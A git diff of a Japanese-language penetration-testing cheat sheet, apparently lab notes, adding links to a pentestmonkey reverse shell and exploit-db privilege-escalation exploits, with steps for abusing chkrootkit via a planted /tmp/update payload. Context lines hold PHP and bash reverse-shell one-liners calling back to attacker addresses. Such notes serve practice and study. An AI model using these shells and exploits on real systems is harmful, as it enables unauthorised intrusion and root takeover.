@@ -1058,6 +1058,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
+pentestmonkey reverse shell:
 https://github.com/pentestmonkey/php-reverse-shell.git
 
 ```
@@ -1383,6 +1384,13 @@ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nf
 exec $SHELL
 pyenv install 2.7.18
 pyenv global 2.7.18
+```
+
+## Docker
+Buildx:
+クロスコンパイル用環境構築
+```
+docker run --privileged --rm tonistiigi/binfmt --install all
 ```
 
 ## base64,16進数 → テキスト
@@ -1993,6 +2001,9 @@ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ```
 /usr/bin/passwd
 ```
+
+### Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
+https://www.exploit-db.com/exploits/45010
 
 ## Tips
 ### ファイルの検索
@@ -2852,6 +2863,9 @@ FreePBX 2.10.0/Elastix 2.2.0 - Remote Code Execution:
 https://www.exploit-db.com/exploits/18650
 'extension'はsvwarを使用してreqauthとなっている数値をを指定
 例) svwar -m INVITE -e100-999 10.10.10.7
+
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection:
+https://www.exploit-db.com/exploits/24044
 ```
 
 ## Privilege Escalation(Linux)
@@ -2863,6 +2877,14 @@ https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local
 GNU Screen 4.5.0 - Local Privilege Escalation:
 ターゲットマシンのgccでexploit内のコードをコンパイルできない場合、事前にコンパイル作業を攻撃者環境で済ませてlibhax.soとrootshellバイナリを送信し、41154.sh内のスクリプトを順に手動で実行する
 https://www.exploit-db.com/exploits/41154
+
+Chkrootkit 0.49 - Local Privilege Escalation:
+/tmp/updateファイルがchkrootkitにより実行される
+このため/tmp/updateにmsfvenomで生成したバイナリやreverse shellペイロードを書き込んだスクリプトを配置しておくことで、chkrootkitがroot権限で(uid=0)で実行できるまたはされる状況においてrootシェルを取得できる
+https://www.exploit-db.com/exploits/33899
+
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation:
+https://www.exploit-db.com/exploits/45010
 ```
 
 ## Initial Shell(Windows)
